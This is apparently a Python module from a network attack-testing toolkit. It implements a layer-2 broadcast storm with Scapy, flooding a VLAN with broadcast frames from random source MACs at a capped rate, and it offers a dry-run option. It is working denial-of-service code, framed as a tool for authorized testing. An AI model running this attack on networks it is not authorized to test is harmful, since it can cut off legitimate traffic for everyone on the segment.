"""Broadcast storm: send a high rate of broadcast frames into the segment.

A switch floods a broadcast frame to every port of its VLAN, and Ethernet has no
time-to-live field. A broadcast that enters a loop keeps circulating, and every copy is
copied again at each switch. A high rate of broadcasts saturates links and CPUs, and it
can stop legitimate traffic in the whole VLAN.

Every frame here is a broadcast from a random unicast source MAC, with a payload of the
configured size. The payload uses an experimental EtherType, so no host parses it as IP or
ARP. The effect to measure is the delivered rate, and the copies a loop creates.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp

from macabre.attacks.common import BROADCAST_MAC, random_mac

MAX_RATE = 5000.0          # frames per second; higher rates are refused
BATCH_SECONDS = 0.1        # frames are sent in batches this long
EXPERIMENTAL_ETHERTYPE = 0x88B5   # IEEE 802 local experimental EtherType
MAX_PAYLOAD = 1400


@dataclass(frozen=True)
class BroadcastStormConfig:
    iface: str                  # attacker interface, on the segment under test
    rate: float = 100.0         # broadcast frames per second
    payload_size: int = 64      # payload bytes per frame
    count: int = 0              # frames to send in total; 0 = run until stopped
    dry_run: bool = False       # build frames but do not send them

    def __post_init__(self) -> None:
        if not 0 < self.rate <= MAX_RATE:
            raise ValueError(f"Rate must be between 0 and {MAX_RATE:g} frames per second.")
        if not 0 <= self.payload_size <= MAX_PAYLOAD:
            raise ValueError(f"Payload size must be between 0 and {MAX_PAYLOAD} bytes.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")


@dataclass
class BroadcastStormStats:
    frames: int = 0
    status: str = ""


def storm_frames(rng: random.Random, how_many: int, payload_size: int) -> list:
    """Broadcast frames from random source MACs, with random payloads of `payload_size` bytes."""
    frames = []
    for _ in range(how_many):
        payload = bytes(rng.getrandbits(8) for _ in range(payload_size))
        frames.append(Ether(src=random_mac(rng), dst=BROADCAST_MAC, type=EXPERIMENTAL_ETHERTYPE) / Raw(payload))
    return frames


def run_broadcast_storm(
    config: BroadcastStormConfig,
    stop_event: threading.Event,
    on_progress: Callable[[BroadcastStormStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> BroadcastStormStats:
    """Send broadcast frames at `rate` per second until `count` or `stop_event`."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = BroadcastStormStats(
            status=(
                f"Dry run: would send about {config.rate:g} broadcast frames per second, "
                f"{config.payload_size} bytes each. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    per_batch = max(1, round(config.rate * BATCH_SECONDS))
    stats = BroadcastStormStats()
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        batch = per_batch
        if config.count:
            batch = min(batch, config.count - stats.frames)
        send(storm_frames(rng, batch, config.payload_size), iface=config.iface, verbose=False)
        stats.frames += batch
        on_progress(replace(stats))
        stop_event.wait(BATCH_SECONDS)
    return stats
